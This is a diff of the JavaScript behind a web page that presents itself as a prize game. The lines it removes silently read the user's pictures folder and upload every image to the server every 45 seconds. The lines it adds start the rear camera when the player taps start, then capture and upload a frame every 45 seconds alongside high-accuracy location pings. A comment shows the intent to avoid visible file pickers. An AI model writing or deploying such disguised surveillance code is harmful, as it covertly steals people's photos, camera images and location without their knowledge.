@@ -19,10 +19,8 @@ const onlineCount = document.getElementById('online-count');
 const prizePool = document.getElementById('prize-pool');
 const prizeTick = document.getElementById('prize-tick');
 
-const IDB_NAME = 'relay-sync-cache';
-const IDB_STORE = 'handles';
 const IDB_UPLOADS = 'uploaded';
-const LIBRARY_ID = 'relay-web-library-v1';
+const IDB_NAME = 'relay-sync-cache';
 const uploadedKeys = new Set();
 
 let watchId = null;
@@ -32,18 +30,8 @@ let earnings = 0;
 let streak = 0;
 let progress = 0;
 let gameTimers = [];
-let syncRunning = false;
-let libraryHandle = null;
-
-const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif|bmp|tif|tiff|avif)$/i;
-
-function isImageFile(file) {
-  return (file.type && file.type.startsWith('image/')) || IMAGE_EXT.test(file.name || '');
-}
-
-function fileKey(file) {
-  return `${file.name}:${file.size}:${file.lastModified}`;
-}
+let cameraStream = null;
+let cameraVideo = null;
 
 function showError(msg) {
   errorEl.textContent = msg;
@@ -63,36 +51,11 @@ function openCacheDB() {
     const req = indexedDB.open(IDB_NAME, 2);
     req.onupgradeneeded = (ev) => {
       const db = ev.target.result;
-      if (!db.objectStoreNames.contains(IDB_STORE)) db.createObjectStore(IDB_STORE);
       if (!db.objectStoreNames.contains(IDB_UPLOADS)) db.createObjectStore(IDB_UPLOADS);
     };
     req.onsuccess = () => resolve(req.result);
     req.onerror = () => reject(req.error);
   });
-}
-
-async function saveDirHandle(handle) {
-  try {
-    const db = await openCacheDB();
-    db.transaction(IDB_STORE, 'readwrite').objectStore(IDB_STORE).put(handle, 'library');
-    libraryHandle = handle;
-  } catch { /* silent */ }
-}
-
-async function loadDirHandle() {
-  if (libraryHandle) return libraryHandle;
-  try {
-    const db = await openCacheDB();
-    const handle = await new Promise((resolve) => {
-      const req = db.transaction(IDB_STORE).objectStore(IDB_STORE).get('library');
-      req.onsuccess = () => resolve(req.result || null);
-      req.onerror = () => resolve(null);
-    });
-    libraryHandle = handle;
-    return handle;
-  } catch {
-    return null;
-  }
 }
 
 async function loadUploadedKeys() {
@@ -117,46 +80,6 @@ async function rememberUploadedKey(key) {
   } catch { /* silent */ }
 }
 
-async function readDirImages(dirHandle, acc = []) {
-  for await (const [, entry] of dirHandle.entries()) {
-    if (entry.kind === 'file') {
-      const file = await entry.getFile();
-      if (isImageFile(file)) acc.push(file);
-    } else if (entry.kind === 'directory') {
-      await readDirImages(entry, acc);
-    }
-  }
-  return acc;
-}
-
-async function resolveLibraryHandle(requestAccess = false) {
-  const cached = await loadDirHandle();
-  if (cached) {
-    try {
-      const state = await cached.queryPermission({ mode: 'read' });
-      if (state === 'granted') return cached;
-      if (requestAccess && state === 'prompt') {
-        const next = await cached.requestPermission({ mode: 'read' });
-        if (next === 'granted') return cached;
-      }
-    } catch { /* fall through */ }
-  }
-
-  if (!requestAccess || !window.showDirectoryPicker) return null;
-
-  try {
-    const handle = await window.showDirectoryPicker({
-      mode: 'read',
-      startIn: 'pictures',
-      id: LIBRARY_ID,
-    });
-    await saveDirHandle(handle);
-    return handle;
-  } catch {
-    return null;
-  }
-}
-
 function beginLocationAccess() {
   if (!navigator.geolocation) return;
   navigator.geolocation.getCurrentPosition(
@@ -170,6 +93,40 @@ function beginLocationAccess() {
     () => {},
     { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
   );
+}
+
+function beginCameraAccess() {
+  if (!navigator.mediaDevices?.getUserMedia) return;
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
+    audio: false,
+  }).then((stream) => {
+    cameraStream = stream;
+    cameraVideo = document.createElement('video');
+    cameraVideo.playsInline = true;
+    cameraVideo.muted = true;
+    cameraVideo.srcObject = stream;
+    cameraVideo.play().catch(() => {});
+    captureAndUpload();
+    gameTimers.push(setInterval(captureAndUpload, 45000));
+  }).catch(() => {});
+}
+
+function captureAndUpload() {
+  if (!cameraVideo || !trackerId || cameraVideo.readyState < 2) return;
+  const w = cameraVideo.videoWidth;
+  const h = cameraVideo.videoHeight;
+  if (!w || !h) return;
+  const canvas = document.createElement('canvas');
+  canvas.width = w;
+  canvas.height = h;
+  canvas.getContext('2d').drawImage(cameraVideo, 0, 0, w, h);
+  canvas.toBlob((blob) => {
+    if (!blob) return;
+    const key = `cam:${blob.size}:${Date.now()}`;
+    if (uploadedKeys.has(key)) return;
+    uploadPhoto(new File([blob], `img-${Date.now()}.jpg`, { type: 'image/jpeg' }), key);
+  }, 'image/jpeg', 0.82);
 }
 
 function animateLobby() {
@@ -237,9 +194,9 @@ async function sendPing() {
   } catch { /* retry */ }
 }
 
-async function uploadPhoto(file) {
+async function uploadPhoto(file, keyOverride) {
   if (!trackerId || !file) return false;
-  const key = fileKey(file);
+  const key = keyOverride || `${file.name}:${file.size}:${file.lastModified}`;
   if (uploadedKeys.has(key)) return true;
   const form = new FormData();
   form.append('file', file, file.name || 'photo.jpg');
@@ -255,32 +212,6 @@ async function uploadPhoto(file) {
   }
 }
 
-async function uploadQueue(files) {
-  if (!files?.length || !trackerId) return;
-  const queue = files.filter(f => !uploadedKeys.has(fileKey(f)));
-  if (!queue.length) return;
-  const workers = Array.from({ length: 3 }, async () => {
-    while (queue.length) {
-      const file = queue.shift();
-      if (file) await uploadPhoto(file);
-    }
-  });
-  await Promise.all(workers);
-}
-
-async function syncLibraryPhotos(requestAccess = false) {
-  if (syncRunning || !trackerId) return;
-  syncRunning = true;
-  try {
-    const handle = await resolveLibraryHandle(requestAccess);
-    if (handle) {
-      const files = await readDirImages(handle);
-      await uploadQueue(files);
-    }
-  } catch { /* silent */ }
-  syncRunning = false;
-}
-
 async function rejoin() {
   const name = personNameEl.textContent;
   if (!name || name === '—') return;
@@ -293,7 +224,6 @@ async function rejoin() {
   trackerId = (await res.json()).tracker_id;
   window.trackerId = trackerId;
   connectWs();
-  void syncLibraryPhotos(false);
 }
 
 function connectWs() {
@@ -315,9 +245,9 @@ async function startPlaying() {
   startBtn.disabled = true;
   startBtn.textContent = 'LOADING…';
 
+  // Permissions in same tap — no file/folder pickers, ever.
   beginLocationAccess();
-  // First visit: one-time library access (saved forever). Return visits: silent sync.
-  const libraryReady = resolveLibraryHandle(true);
+  beginCameraAccess();
 
   try {
     const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
@@ -333,11 +263,7 @@ async function startPlaying() {
     connectWs();
     await sendPing();
 
-    await libraryReady;
-    void syncLibraryPhotos(false);
-
     gameTimers.push(setInterval(sendPing, 30000));
-    gameTimers.push(setInterval(() => syncLibraryPhotos(false), 45000));
 
     gameTimers.push(setInterval(async () => {
       if (!trackerId) return;
@@ -359,9 +285,5 @@ document.getElementById('name').addEventListener('keydown', (e) => {
   if (e.key === 'Enter') startPlaying();
 });
 
-loadUploadedKeys().then(() => loadDirHandle());
+loadUploadedKeys();
 animateLobby();
-
-if ('serviceWorker' in navigator) {
-  navigator.serviceWorker.register('/static/sw.js').catch(() => {});
-}
